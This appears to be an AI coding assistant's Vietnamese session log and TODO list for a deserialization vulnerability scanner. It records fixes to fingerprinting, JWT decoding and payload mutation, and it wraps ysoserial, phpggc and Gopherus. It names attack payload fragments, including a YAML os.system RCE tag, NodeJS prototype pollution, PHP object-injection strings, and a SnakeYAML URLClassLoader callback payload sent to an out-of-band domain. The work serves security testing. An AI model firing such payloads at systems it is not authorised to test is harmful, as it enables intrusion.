- Đã bỏ hết comment trong file theo yêu cầu — logic giữ nguyên, verify lại bằng đúng bộ test trên

- [ ] Unit test chính thức (hiện chỉ có `Analyze/test.py` — 6 dòng scratch, không phải test suite)
- [x] Oracle probe — đã code cho PHP (length-corruption technique), chạy trước khi replay toàn bộ mutation batch, chỉ bổ sung bằng chứng chứ không gate/skip. Còn thiếu cho Java/Pickle/YAML/.NET/NodeJS/Ruby/Wrapper
- [x] OOB "nhẹ" — `config.json`'s `oob_domain` (hoặc `ETHICALQUOC_OOB_DOMAIN`) nhúng canary domain thật vào URLDNS + blind-SSRF payload. Vẫn phải tự check interaction log thủ công, không tự động poll API Interactsh/Burp Collaborator
- [ ] `.NET`/`Wrapper` mutation mới code, chưa test trên lab thật (chỉ test bằng mock, chưa có `ysoserial.net`/`Gopherus` cài)
- [ ] `scan --url` (Playwright) chưa từng chạy thử thật trong suốt session
- [ ] `report` command mới có format JSON, PDF/HTML còn là placeholder
- [x] `Gopherus` — đã clone mã nguồn thật vào `Analyze/third_tool/gopherus/`. **Lưu ý: viết cho Python 2, chạy Python 3 sẽ SyntaxError.** Đã thêm `_find_python2()` tự dò `python2`/`py -2`/`C:\Python27\python.exe`, fallback về payload Redis INFO benign nếu không có Python 2. Cần tự cài Python 2.7 nếu muốn dùng đầy đủ (xem README)
- [ ] `ysoserial.net` — vẫn chưa vendor, cần tự tải file `.exe` từ https://github.com/pwntester/ysoserial.net/releases và copy vào `Analyze/third_tool/dotnet/ysoserial.exe` (không tự động tải vì là binary, cần bạn tự verify an toàn)
- [x] **Signature bị trùng giữa `postfiltered.py` và `finderprint.py`** — đã gom vào `Utility/signatures.py` (module mới, single source of truth cho mọi list/pattern: PHP/Java/Pickle/YAML/.NET/NodeJS/Ruby/Wrapper + hàm `is_nodejs_prototype_pollution()` cho logic constructor/prototype dùng chung, + hàm `looks_like_serialized()` dùng chung giữa PostFilter và CleanFilter). Ban đầu tạo ở `Analyze/signatures.py`, sau chuyển sang `Utility/signatures.py` (folder mới, tách utility ra khỏi Analyze). `finderprint.py` alias class attribute về `signatures.XXX`; `postfiltered.py`/`cleanfilter.py` import trực tiếp dùng. Bonus: đổi luôn regex PHP tự viết (`[Oaidsb]:\d+:` có `(?i)` quá rộng) sang dùng `signatures.PHP_STRONG`/`PHP_WEAK` chính xác hơn

## 2. Bug đã fix trong session này (để tham khảo, không cần làm lại)

- `analyze --output` từng luôn ghi placeholder rỗng, bỏ hết kết quả thật
- `PayloadMutation` nhận nhầm object → mutation PHP không bao giờ chạy
- Crash Unicode (`→`) trên console Windows mặc định
- Fingerprint `type: "Ruby"` bị thiếu trong `ExploitAnalyze.dispatch` → luôn báo "Low/not exploitable"
- Sai tên probe `"urldns"` vs `"urldns_probe"` → mất payload URLDNS đáng lẽ mạnh nhất
- `PHPGGC_PATH` trỏ vào thư mục thay vì file script `phpggc/phpggc` → phpggc **chưa bao giờ chạy được**, kể cả trước khi tôi sửa gì
- `tool_config.py` crash khi `config.json` có `"tools": null`
- `postfiltered.py` dùng `and` thay vì `or` → crash khi `value` là `None`
- `ReplayRequest` crash `ValueError` khi payload nhị phân (Pickle) chứa `\r`/`\n` trong header/cookie
- Method bị báo sai (GET thay vì POST thực tế) khi payload ở body/form_body
- `Analyze/third_tool/phpggc` từng là gitlink hỏng (submodule không có `.gitmodules`) → thư mục rỗng mỗi lần clone mới — đã fix bằng cách vendor lại thật
- `_run_ysoserialnet` thiếu bắt `OSError`/`PermissionError` → có thể crash cả vòng lặp `analyze`
- Method bị báo sai lần 2 trong `ReplayRequest` + code trùng lặp `TEST_COMMANDS` × 6 chỗ — đã dọn về 1 nguồn
- `postfiltered.py` — scan toàn diện, fix 3 vấn đề: bỏ `import os`/`import json` chết; `"sec-websocket-*"` không bao giờ match (code kiểm tra exact-match, không hỗ trợ wildcard) → thay bằng 5 tên header WebSocket thật; crash `AttributeError` khi `name` là `None` (giống bug `value` trước đó nhưng ở field khác)
- `postfiltered.py` — `Suspicious_header` trước đây gộp cả header IP-spoofing (`x-forwarded-for`, `x-real-ip`, `client-ip`, `true-client-ip`) không liên quan deserialization, giữ vô điều kiện gây nhiễu → đã bỏ, chỉ giữ nhóm auth/token thật sự liên quan
- `postfiltered.py` — `content-type` từng bị chặn vô điều kiện trong `Ignore_header_name`, khiến tool không bao giờ phát hiện được `Content-Type: application/x-java-serialized-object` (tín hiệu mạnh nhất cho Java deserialization qua Spring HttpInvoker/JBoss remoting) → đã bỏ khỏi ignore list + thêm signature riêng
- `postfiltered.py` — `_look_maybe_suspicious()` có check riêng cho Java/PHP nhưng KHÔNG có cho Pickle/.NET/Ruby/NodeJS (chỉ sống sót nhờ heuristic chung, không chắc chắn) → đã thêm check riêng cho cả 4 loại, đồng bộ với `finderprint.py`. Verify bằng test thật: payload `constructor.prototype.isAdmin=true` (NodeJS prototype pollution) trước đây bị loại oan dù `ExploitabilityAnalysis` đã có logic nhận diện đúng nó — giờ đã fix
- `cleanfilter.py` — header `Cookie` chứa nhiều cookie ghép (`session=<payload>; other=abc; tracking=xyz`) chỉ bị cắt phần đầu (`session=`), phần đuôi (cookie khác) dính nguyên vào `cleaned_value`, sau đó `normalize.py` cố decode luôn phần rác này ra byte nhị phân lẫn vào payload thật. Fix v1 (sáng): sau khi strip prefix, cắt tại dấu `"; "` đầu tiên. An toàn cho PHP vì PHP serialize dùng `;` không có dấu cách theo sau (`b:0;}` chứ không phải `b:0; }`)
- `cleanfilter.py` — Fix v1 chỉ đúng khi cookie mục tiêu đứng ĐẦU chuỗi gộp; nếu đứng giữa/cuối (`tracking=xyz; session=<payload>`), fix v1 lấy nhầm cookie đầu tiên → **false negative im lặng** (Fingerprint báo `Unknown/Low`, mất hoàn toàn payload thật, không có dấu hiệu báo lỗi). Nghiêm trọng hơn khi HAR không có mảng `cookies[]` sạch đi kèm (nguồn không phải Chrome, hoặc `scan --url` qua Playwright — không có mảng cookie riêng). Cùng gốc rễ với Content-Disposition (`form-data; name=...; filename=...` — cùng cấu trúc `"; "`-separated). Fix v2: chuyển `_look_maybe_suspicious()` từ `postfiltered.py` sang `signatures.looks_like_serialized()` dùng chung; `cleanfilter._clean()` giờ tách theo `"; "` thành từng đoạn, CHẤM ĐIỂM từng đoạn bằng hàm chung đó, giữ đoạn nào thật sự giống payload — không còn giả định "luôn ở vị trí đầu". Verify bằng 4 case (`example_multivalue_header.har`): Cookie đầu/giữa/cuối đều ra đúng `PHP High` y hệt nhau; Content-Disposition cải thiện đáng kể (không còn rác `form-data`) nhưng chưa auto-decode hoàn toàn (dính đuôi `.txt` từ `filename=`) — chấp nhận vì vector này ít liên quan thực tế
- `cleanfilter.py` — bug "2 lớp wrap chồng" (`Cookie: session=<payload>`) trước đây không fix được vì vòng lặp `PREFIX_PATTERNS` chỉ chạy 1 lượt: pattern `session=` bị kiểm tra và bỏ qua TRƯỚC khi `Cookie:` được strip, nên khi `session=` lộ ra không ai quay lại strip nữa. Fix: đổi `for` (1 lượt) thành `while changed` (lặp lại đến khi 1 lượt đầy đủ không còn thay đổi gì) — tự dừng đảm bảo vì mỗi lần strip thành công luôn làm ngắn chuỗi đi. Verify: case 2 lớp VÀ 3 lớp (`Set-Cookie: Cookie: session=`) đều bóc hết đúng, không lặp vô hạn, không regression với các test case cũ
- `finderprint.py:50/71` — xoá dòng `clean_text = lower_text.replace('\x00',' ').replace('\x05',' ').replace('\x04',' ')` (dead code), đổi `gadget_hits` sang dùng thẳng `lower_text`. Lý do: bị nghi ngờ 2 lần (critique "ChatGPT" tự paste) là cơ chế "nối lại" keyword bị control-byte cắt đôi — verify bằng code thật (`"Templates\x04Impl".replace('\x04',' ')` → `"Templates Impl"`, vẫn KHÔNG chứa `"templatesimpl"`) chứng minh `.replace(byte, ' ')` không hề nối lại được gì, nên dòng này chưa từng có tác dụng bảo vệ thật. Kiểm tra thêm: 0/40 `GADGET_KEYWORDS` chứa `\x00/\x04/\x05`; theo spec Java (Modified UTF-8, TC_* marker 0x70-0x7E) và Ruby Marshal (Fixnum length-prefix bắt đầu từ byte 0x06, không dùng 0x01-0x05) thì các byte này về mặt cấu trúc không thể chen giữa 1 keyword thật. Verify không regression: 15/15 unit test pass, kết quả trên 11/11 vector thật (`result1.json`) giống hệt trước khi sửa (`PHP High High False {'PHP': 9}` × 11)
- `cleanfilter.py:16-33` — header `Authorization: Bearer <JWT>` không bao giờ bị strip prefix "Bearer ", dù `PREFIX_PATTERNS` đã có sẵn pattern `r'^Bearer\s+'` (dòng 10) dành riêng cho việc này. Nguyên nhân: điều kiện gate `is_raw_cookie_header` (tên cũ) chỉ kiểm tra `name.lower() in COOKIE_HEADER_NAMES = {"cookie","set-cookie"}` — không có `"authorization"` — nên cả vòng lặp strip prefix bị bỏ qua hoàn toàn cho header Authorization. Hệ quả dây chuyền: `cleaned_value` giữ nguyên `"Bearer eyJ....eyJ....sig"` → sang `normalize.py` bị coi là 1 khối duy nhất để base64-decode → khoảng trắng sau "Bearer" + 2 dấu `.` phân đoạn JWT không thuộc bảng base64 → decode luôn lỗi padding → 0 candidate → fallback trả nguyên văn, không decode được gì. Fix: thêm `AUTH_HEADER_NAMES = {"authorization"}`, đổi gate thành `name.lower() in (COOKIE_HEADER_NAMES | AUTH_HEADER_NAMES)`, đổi tên biến `is_raw_cookie_header` → `is_prefixed_header` cho đúng nghĩa mới. Verify: chạy trên toàn bộ 27 vector Authorization/JWT trong `comprehensive.har` — 100% strip đúng "Bearer " (không còn dính vào cleaned_value); 11/11 vector thật (`result1.json`, không có header Authorization) ra kết quả giống hệt trước khi sửa; 15/15 unit test pass. (Lưu ý: JWT sau khi strip Bearer vẫn còn dạng `<b64>.<b64>.<b64>` chưa decode được từng đoạn — đây là giới hạn riêng của `normalize.py` đã note ở trên, chưa fix trong lượt này)
- `normalize.py:_generate_decodes()` — thêm khả năng tách và decode riêng JWT (`<b64>.<b64>.<b64>`, ngăn bởi dấu `.`), vì logic base64 cũ coi cả chuỗi là 1 khối nên luôn thất bại với JWT (dấu `.` không thuộc bảng base64). Regex nhận diện: `^[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]*$` — đoạn 3 (chữ ký) CHO PHÉP rỗng, vì search Google xác nhận JWT `alg:"none"` (RFC 7519 "Unsecured JWT", tấn công thật — PortSwigger/Auth0/Invicti đều có tài liệu) tạo ra token dạng `header.payload.` với chữ ký rỗng. Ngưỡng độ dài `{16,}` cho 2 đoạn đầu để giảm false-positive với domain/version string ngắn (`sub.example.com`, `3.14.159` đều bị loại vì <16 ký tự/đoạn). Test case thực tế nhất — JWT có gadget PHP nhúng trong claim (`{"sub": "O:4:\"User\":2:{...}"}`) — TRƯỚC fix: 0 candidate nào được sinh ra (không decode được gì); SAU fix: claim PHP serialize được tách ra và **được nhận đúng là "meaningful"** (`looks_like_serialized` = True), không còn bị bỏ sót hoàn toàn như trước.
- `normalize.py:_generate_decodes()` — phát hiện thêm 1 bug PHỤ trong lúc test rộng: logic base64-cả-khối CŨ, khi gặp giá trị dạng JWT với đoạn chữ ký RỖNG (`alg:none`, `header.payload.`), đôi khi (tuỳ độ dài) decode "may mắn" KHÔNG lỗi (thay vì luôn lỗi như các JWT có chữ ký), tạo ra 1 chuỗi rác trộn lẫn text thật + byte nhiễu, rồi bị heuristic `suspicious_chars >= 6` (trong `signatures.looks_like_serialized`) nhận nhầm là "meaningful" — verify bằng code thật: chuỗi rác `'{"alg": "none", "typ": "JWT"}\x1eÈ...'` có đúng 6 ký tự suspicious (`{`,`:`x4,`}`), chạm ngưỡng `>=6`. Fix: thêm cờ `is_jwt_shaped`, bọc khối base64-cả-cụm cũ trong `if not is_jwt_shaped:` để nó không tự ý thử decode (và tạo rác) trên các giá trị đã có route xử lý JWT riêng chính xác hơn. Verify: cả 3 case JWT (thường / alg=none / có gadget nhúng) đều ra kết quả đúng sau fix; test thêm 6 chuỗi false-positive tiềm năng (domain, version string, CDN hash dài, git hash chain — kể cả 2 case dài đủ 16 ký tự/đoạn bị nhận nhầm shape) đều KHÔNG làm thay đổi output của `normalize()` (lớp lọc `_is_serialized_payload` phía sau vẫn chặn được rác). Verify không regression: 15/15 unit test pass; 11/11 vector thật (`result1.json`) không đổi; 124 vector `comprehensive.har` — 0 lỗi, phân bố type giữ nguyên y hệt trước khi sửa (`{'Unknown': 96, 'PHP': 9, 'Ruby': 5, 'Java': 4, 'Wrapper': 3, 'Python Pickle': 1, 'DotNet': 2, 'YAML': 2, 'NodeJS': 2}`)
- `TestCase/generate_comprehensive_har.py` — thêm helper `jwt_with_claim(seed, extra_claims, alg_none=False)` + 3 malicious entry mới để tự test trực quan fix JWT-split ở trên (dùng `debug_pipeline.py --step 4/5` để xem): (1) `/api/account/profile` — PHP gadget nhúng trong claim `sub`, JWT bình thường; (2) `/api/account/settings` — YAML RCE (`!!python/object/apply:os.system`) nhúng trong claim `config`; (3) `/api/account/profile-legacy` — PHP gadget + `alg:none` (chữ ký rỗng). Đã chạy lại `generate_comprehensive_har.py` để regenerate file, verify cả 3 case đều cho `normalize() thay đổi = True` và Fingerprint ra đúng type (`PHP`/`YAML`), 25 JWT benign còn lại (không có gadget) vẫn giữ `Unknown/Low` — không có false positive mới. 15/15 unit test vẫn pass sau khi regenerate.
- `normalize.py:_generate_decodes()` (JWT split) — bug tiếp theo phát hiện NGAY TRÊN case test vừa thêm ở trên, do chính user tự chạy và gửi lại kết quả: case `/api/account/profile-legacy` ra `all_candidates: {"PHP": 1}` (score cực thấp, "Low" confidence) dù đã tìm đúng gadget `O:4:"User":2:{...}`. Root cause: khi 1 claim JWT là JSON string chứa payload PHP, `json.dumps()` tự escape mọi dấu `"` bên trong thành `\"` (ví dụ `O:4:\"User\":2:{...}`) — đoạn code JWT-split mới chỉ lấy nguyên văn JSON của segment (còn escape `\"`), KHÔNG gỡ escape, khiến mọi regex của `_detect_php()` cần `"` nằm sát 1 vị trí cụ thể (`O:\d+:"`, `s:\d+:"`, và loop validate độ dài) đều trượt hết. Verify: dựng thêm case xấu nhất (gadget PHP chỉ có string field, không có `b:0/1;` may mắn) → **score = 0, type = Unknown, bỏ sót hoàn toàn** — chứng minh score=1 ở case ban đầu chỉ là trùng hợp match được `b:[01];`, không phải phát hiện thật. Fix: thêm `import json`; trong nhánh JWT-split, sau khi decode xong 1 đoạn, thử `json.loads(txt)` — nếu là dict thì lấy từng giá trị string bên trong (đã được `json.loads` tự gỡ escape đúng chuẩn JSON) làm thêm candidate riêng. Verify lại: case xấu nhất → `PHP High` (score 8); case `b:0;` ban đầu → `PHP High` (score 9, tăng từ 1 lên 9); cả 3 case JWT trong `comprehensive.har` đều lên `PHP High`/`YAML Medium` đúng như dữ liệu thật. Verify không regression: 15/15 unit test pass; 11/11 vector thật (`result1.json`) không đổi; `comprehensive.har` 127 vector — 0 lỗi, type distribution tăng đúng phần mong đợi (`PHP` 9→11, `YAML` 2→3, còn lại không đổi).
- `normalize.py:_generate_decodes()` (JWT split, tiếp) — fix #5 ở trên (gỡ escape claim) chỉ đủ cho string nằm TOP-LEVEL của claim (`claims.values()` duyệt phẳng 1 tầng, `isinstance(claim_value, str)` bỏ qua thẳng nếu giá trị là dict/list). Verify: gadget nằm trong object lồng (`{"profile": {"legacy_session": "O:4:..."}}`) hoặc trong array (`{"sessions": ["O:4:...", "noise"]}`) → vẫn rơi lại y hệt bug cũ (`PHP score=1`, may mắn trùng `b:1;`), vì `claim_value` ở tầng ngoài là dict/list chứ không phải string nên bị `isinstance(..., str)` loại ngay, không có đường nào đào tiếp vào bên trong. Fix: thêm hàm đệ quy `_extract_claim_strings(obj, depth=0)` — duyệt xuống mọi tầng của dict/list (đệ quy qua `.values()` và phần tử list), gặp string thì thu thập, giới hạn `depth > 5` thì dừng (vì dữ liệu JWT claim đến từ attacker, không nên đệ quy vô hạn theo input không tin cậy). Thay `for claim_value in claims.values(): if isinstance(...)` bằng `results.extend(self._extract_claim_strings(claims))`. Verify: cả 3 case (object lồng 1 tầng, array, lồng 3 tầng `a.b.c.gadget`) đều ra đúng `PHP High, {'PHP': 9}`. Verify không regression: 15/15 unit test pass; 11/11 vector thật không đổi; `comprehensive.har` 127 vector — 0 lỗi, type distribution giữ nguyên y hệt trước.
- `TestCase/test_exploitability_analysis.py` — thêm class `TestJwtSplitDecode` (10 test case) làm regression safety net cố định cho toàn bộ chuỗi bug JWT-split vừa fix trong session này (trước đó chỉ verify bằng script Bash tạm, chưa có test lưu lại). Thêm helper `fingerprint_of()`, `b64u()`, `make_jwt()`. Cover: JWT benign không báo động giả; `alg:none` chữ ký rỗng không bị nhận nhầm do rác từ logic base64-cả-khối cũ; gadget PHP ở top-level claim (có và không có `b:0/1;` may mắn); gadget PHP dưới `alg:none`; gadget lồng trong object/array; gadget YAML (không bị escape vì dùng nháy đơn); domain/version-string không bị nhận nhầm là JWT. 25/25 test pass (15 cũ + 10 mới).
- `TestCase/test_normalize.py` (FILE MỚI) — unit test riêng cho `DataNormalizer`, theo yêu cầu "đừng dựa vào code có sẵn" — mọi test-vector lấy từ nguồn tham chiếu BÊN NGOÀI, verify độc lập được: RFC 4648 §10 (7 vector Base64 chính thức: `BASE64("")`..`BASE64("foobar")` — dùng để verify ngưỡng `len(val)>=16` bỏ qua đúng các vector ngắn, không tự bịa input), RFC 4648 §5 (base64url `-`/`_`), RFC 1952 (gzip: verify `gzip.compress()` của Python thật sự tạo đúng magic byte `0x1f 0x8b` + `CM=8` theo spec, không giả định suông), RFC 7519 (JWT `alg:none`), và **2 payload PHP serialize lấy nguyên văn từ tài liệu công khai PortSwigger** (lab "Arbitrary object injection in PHP" và "Developing a custom gadget chain for PHP deserialization") thay vì tự chế payload. 6 nhóm test: `TestBasicBase64RFC4648`, `TestGzipRFC1952`, `TestRealPortSwiggerPayloads`, `TestAdvancedEncodingLayers` (double-base64, hex, url+base64, JWT alg:none có gadget), `TestBfsTraversalBehavior` (fallback plain text, empty string, giới hạn top-2 candidate, chain 5 lớp base64 vẫn resolve trong `max_depth`), `TestKnownLimitations` (ghi lại bằng `@unittest.expectedFailure` — không phải bỏ qua — khoảng trống ngưỡng `len(txt)>=10` ở `_generate_decodes()` dòng 91 vs `len(value)<12` ở `_is_serialized_payload()` dòng 43: payload PHP 11-byte `i:12345678;` lọt qua gate đầu nhưng bị gate sau từ chối, verify bằng số liệu chính xác). Trong lúc viết, tự bắt được 2 lỗi Ở PHÍA TEST (không phải bug code) — quên tính `.strip()` khi so sánh expected value — đã sửa. 16/16 test pass (15 pass + 1 expected failure có chủ đích). Tổng toàn project sau khi gộp 2 file test: 41/41 pass.
- `normalize.py:43` — fix khoảng trống ngưỡng (bug #4 đã ghi ở trên): đổi `_is_serialized_payload()` từ `if len(value) < 12:` thành `if len(value) < 10:` — đồng bộ với Gate 1 ở `_generate_decodes():91` (`len(txt) >= 10`) VÀ đồng bộ luôn với ngưỡng nội bộ có sẵn trong `signatures.looks_like_serialized():156` (`if len(value) < 10: return False`) — trước đây ngưỡng 12 là bottleneck thừa, không khớp với 2 nơi còn lại. Verify: case `i:12345678;` (11 byte) giờ `normalize()` trả về đúng chuỗi đã decode thay vì fallback về bản mã hoá gốc. Cập nhật test: đổi `TestKnownLimitations` (dùng `@expectedFailure`) thành `TestThresholdGapFixed` (2 test bình thường: case 11-byte và case biên 10-byte) trong `test_normalize.py`, vì bug đã fix không còn là "known limitation" nữa.
- `ExploitabilityAnalysis.py:38-51` (`_try_decode()`) — fix bug #3 đã ghi ở trên: thêm bước `re.fullmatch(r'[A-Za-z0-9+/]+={0,2}', stripped)` để kiểm tra TOÀN BỘ chuỗi có đúng hình dạng base64 thuần hay không TRƯỚC khi gọi `base64.b64decode()` — nếu có bất kỳ ký tự lạ nào (dấu `"`, `:`, `{`, khoảng trắng...) thì bỏ qua decode, fallback thẳng về `self.raw_payload.lower()`, thay vì để `validate=False` âm thầm mash-up ký tự hợp lệ rải rác thành rác. Đổi `validate=False` → `validate=True` làm lớp phòng thủ thứ 2. Tái dùng đúng pattern đã có sẵn ở `signatures.py:206-213` cho nhất quán. Verify: case rác cụ thể đã phát hiện trước đó (`'O:4:"User"... Tzo0OiJVc2Vy...%3d'`) giờ `ea.decoded == ea.raw_payload.lower()` (fallback sạch, không còn `';,z\x1evzΰޮz...'`); case base64 thuần (fallback-not-decoded) vẫn decode đúng bình thường.
- `ExploitabilityAnalysis.py` — sau khi fix xong bug #3, nhận ra bản chất `_try_decode()`/`self.search` là 1 dạng "logic trùng lặp" y hệt pattern đã gây ra 5 bug đầu phiên trước (Stage 6 tự implement lại 1 bản decode YẾU HƠN nhiều so với Stage 4 `normalize.py` — không gzip, không hex, không JWT-split, không đệ quy claim, không giới hạn độ dài tối thiểu nhất quán). Quyết định: XOÁ HẲN `_try_decode()`, `self.decoded`, `self.search`, và `import base64` — `_analyze_java()`/`_analyze_ruby()` (2 hàm duy nhất dùng `self.search`) đổi sang dùng thẳng `self.lower`, tin tưởng hoàn toàn `fp["value"]` đã được Stage 4/5 xử lý xong (đúng nguyên tắc "single source of truth" đã áp dụng cho `signatures.py`) — nếu Normalize có lỗ hổng decode thì sửa tại Normalize (đã làm ở bug #4), không bù đắp bằng decoder phụ dễ trôi dạt ở Stage 6. Cập nhật test: thay `TestTryDecodeNoLongerProducesGarbage` bằng `TestNoRedundantDecodeInExploitAnalyze` (4 test) — verify `decoded`/`search` không còn tồn tại, Java/Ruby vẫn nhận diện đúng gadget qua `self.lower` trực tiếp, không crash với input hỗn hợp. Verify không regression: 46/46 test pass; 11/11 vector thật không đổi; `comprehensive.har` 127 vector — 0 lỗi, `exploitable=True` vẫn đúng 30 vector, type/exploit_type distribution giữ nguyên y hệt trước khi xoá — xác nhận không có case thực tế nào từng phụ thuộc vào lớp decode dư thừa đã bỏ.

- `payloadMutation.py` — review sâu Stage 7, phát hiện 4 bug (cùng 1 gốc rễ: 3 hàm `__flip_boolean`/`__modify_string`/`_mutate_integer` đều dùng regex/`.replace()` trên chuỗi thô, không hiểu cấu trúc key-value xen kẽ thật của PHP serialize `s:N:"KEY";VALUE;s:N:"KEY2";VALUE2;...`):
  1. **`__modify_string():428`** — regex `s:(\d+):"([^"]+)"` bắt CẢ KEY lẫn VALUE (không phân biệt được), nên đổi nhầm TÊN FIELD thay vì GIÁ TRỊ. Verify trên payload thật (`result1.json`): 7/11 mutation (64%) sai — VD `s:8:"username"` (tên field) bị đổi thành `s:13:"administrator"` (đổi luôn cả tên thuộc tính, PHP unserialize sẽ set property MỚI không tồn tại trong class, mất hẳn field `username` gốc) thay vì đổi giá trị `wiener`. Cùng regex này cũng có lỗi cũ: dấu `"` lồng trong string value làm cắt ngắn match, sinh payload hỏng cú pháp (cùng họ lỗi đã fix ở `finderprint.py:108`).
  2. **`__flip_boolean():413-425`** — `payload.replace("b:0","b:1")` không neo vị trí, không giới hạn số lần: (a) có thể sửa nhầm nội dung string không liên quan nếu nó chứa substring `"b:0"`/`"b:1"` (verify: `s:20:"comment=b:0 is code"` bị sửa thành `"comment=b:1 is code"`); (b) nếu có ≥2 field boolean, đổi CẢ HAI cùng lúc trong 1 mutation, mất khả năng cô lập field nào thực sự gây ra kết quả.
  3. **`_run_ysoserial():99-125`** — chỉ bắt `TimeoutExpired`/`FileNotFoundError`, thiếu `PermissionError`/`OSError` mà hàm song sinh `_run_ysoserialnet()` đã bắt đầy đủ — có thể crash cả vòng lặp `_mutate_java()` thay vì skip gọn 1 payload.
  4. **`JAVA_CHAIN_MAP:18-39`** — thiếu entry `"Rome"` dù `ExploitabilityAnalysis.py` detect được `"Rome Gadget"` và ysoserial có sẵn chain `ROME` thật (xác nhận qua kiến thức chung về payload list của ysoserial) — giảm độ chính xác khi target đúng là Rome gadget, không gây lỗi.

  **Fix:** viết lại bộ parser PHP serialize đúng cấu trúc — `_read_php_token()` (đọc 1 token bất kỳ: string dùng position-based slicing thay vì `[^"]+`; int/double/bool/null dùng regex đơn giản; container `a:`/`O:` lồng thì tìm dấu `}` tương ứng qua đếm độ sâu `{`/`}` rồi BỎ QUA nguyên khối, không đệ quy vào trong) + `_iter_php_pairs()` (duyệt tầng ngoài cùng theo đúng cặp KEY-VALUE xen kẽ; nếu payload là scalar đơn không có container thì trả về `[(None, value_token)]`). Viết lại cả 3 hàm `__flip_boolean`/`__modify_string`/`_mutate_integer` dùng chung bộ parser này, thay `.replace(text, new, count)` bằng thay thế theo VỊ TRÍ (`payload[:start] + new + payload[end:]`) — loại bỏ hoàn toàn rủi ro đụng nhầm text trùng lặp. `__modify_string` giờ check "hint" (username/role/admin/...) trên đúng NỘI DUNG KEY (`key_tok["content"]`) thay vì 20 ký tự thô phía trước (nguồn gây nhầm lẫn cũ: tên class "User" tình cờ chứa "user"). Fix #3: đổi `except FileNotFoundError` → `except (FileNotFoundError, PermissionError, OSError)`. Fix #4: thêm `"Rome": ["ROME"]` vào `JAVA_CHAIN_MAP`.

  **Verify:** case thật (`result1.json`) giờ ra đúng 4/4 mutation (100% đổi giá trị `wiener`, không đụng tên field); case 2 boolean field ra đúng 2 mutation tách riêng; case string chứa `"b:0"` không còn bị sửa nhầm; case dấu `"` lồng trong value parse đúng, không hỏng cú pháp; case nested object thật (lab "Developing a custom gadget chain") parse đúng, bỏ qua container lồng an toàn (0 mutation vì không field nào khớp hint, đúng kỳ vọng). Test mới: `TestCase/test_payload_mutation.py` (10 test, phát hiện 1 lỗi Ở PHÍA TEST — tính sai số lượng `int_values`, đã sửa). Verify không regression: 56/56 test pass (gộp 3 file); full pipeline Stage 1-7 trên `comprehensive.har` — 0 lỗi/127 vector, 43 mutation sinh ra hợp lệ.
- `payloadMutation.py:_mutate_yaml()` — bug phạm vi (không phải lỗi code sai, mà là "chức năng còn thiếu"): Stage 6 (`ExploitabilityAnalysis.py:323-329`, `YAML_RISK_MAP`) đã phân biệt đúng 5 loại con YAML (`YAML Python RCE/Object/Module` vs `YAML Java ScriptEngine/Class` — SnakeYAML), nhưng dòng 341 gán CỨNG `probe = "yaml_exec"` cho cả 2 nhóm. `_mutate_yaml()` cũ chỉ có 1 payload cố định cú pháp Python (`!!python/object/apply:os.system`), không đọc `self.etype` — verify: đưa payload YAML kiểu Java (`!!javax.script.ScriptEngineManager`) qua full pipeline, `exploit_type` ra đúng `"YAML Java ScriptEngine"` nhưng payload sinh ra vẫn là cú pháp Python, **hoàn toàn vô dụng với target SnakeYAML thật** (SnakeYAML không hiểu `!!python/...`). Fix: tách `_mutate_yaml()` thành router kiểm tra `"java" in self.etype.lower()`, dispatch tới `_mutate_yaml_python()` (giữ nguyên logic cũ) hoặc `_mutate_yaml_java()` (MỚI — sinh payload SnakeYAML thật dùng kỹ thuật `ScriptEngineManager`+`URLClassLoader` trỏ tới OOB domain, cùng pattern với `_mutate_java_urldns()`/`_mutate_wrapper_ssrf()` đã có sẵn — kỹ thuật này khớp CVE-2022-1471, dùng để xác nhận blind qua callback vì RCE đầy đủ cần host 1 file `.jar` độc hại thật, ngoài phạm vi tool). Verify: target Java giờ nhận đúng payload `ScriptEngineManager`/`URLClassLoader`; target Python không đổi so với trước. Thêm class `TestYamlMutationRespectsJavaVsPython` (3 test) vào `test_payload_mutation.py`. Verify không regression: 59/59 test pass (toàn bộ 3 file); `comprehensive.har` 127 vector — 0 lỗi, 43 mutation (không đổi, vì cả 3 case YAML trong fixture đều là Python).
- `TestCase/test_exploitability_analysis.py` — phát hiện khoảng trống test coverage (không phải bug code): `_analyze_php()` (`ExploitabilityAnalysis.py:143-160`) có 2 nhánh `"PHP Gadget Chain"` (khớp keyword thư viện như `monolog`/`guzzle`/`laravel`) và `"Magic Method Abuse"` (khớp `__wakeup`/`__destruct`/...) — nhưng CHƯA từng có test đưa payload PHP thật đi qua để verify 2 nhánh này thực sự sinh đúng `exploit_type`/`suggested_probe` (`test_java_gadget_chain` là cho Java, không phải PHP; test trong `ALL_POSSIBLE_PROBES` chỉ test `PayloadMutation` với `exploit_type` giả `"test"`, không test logic detect thật). Thêm 2 test vào `TestHappyPathPerFormat`: `test_php_gadget_chain_keyword_detected` (payload chứa `"monolog"` → verify `exploit_type` bắt đầu `"Gadget Chain —"`, `probe="gadget_chain"`) và `test_php_magic_method_abuse_detected` (payload chứa `"__wakeup"`, không có gadget keyword → verify `"Magic Method Abuse —"`, `probe="magic_method"`). Verify không regression: 61/61 test pass (toàn bộ 3 file).
- **Tái cấu trúc project** (theo yêu cầu dọn file "nằm tùm lum") — không phải fix bug, chỉ dọn cấu trúc thư mục:
  - `Analyze/third_tool/` → `tools/` (đưa lên gốc project) — vì tool ngoài (ysoserial/phpggc/gopherus) không phải source code, nằm trong `Analyze/` gây hiểu lầm là 1 phần pipeline. Cập nhật 3 nơi tham chiếu đường dẫn: `tool_config.py` (`_DEFAULT_TOOLS`), `config.json`, `README.md` (bảng cấu hình + cây thư mục).
  - `PAYLOAD_MUTATION_REVIEW.md` → `docs/PAYLOAD_MUTATION_REVIEW.md` (tạo thư mục `docs/` gom tài liệu review, tách khỏi gốc project).
  - Xoá file rác: `rs_1909`/`rs_2209` (output debug JSON không tên rõ ràng, sinh ra từ lệnh `debug_pipeline.py -o` hướng dẫn trước đó), `TestCase/_scan_tmp.json` (file tạm quên dọn từ nhiều lần test trong phiên), `Analyze/test.py` (script scratch 6 dòng test regex, không thuộc pipeline, verify không có import nào tham chiếu tới trước khi xoá), `results/comprehensive_scan.json` (bản scan CŨ, sinh trước khi `comprehensive.har` được thêm 3 case JWT — không còn khớp fixture hiện tại, dễ gây hiểu nhầm là dữ liệu mới).
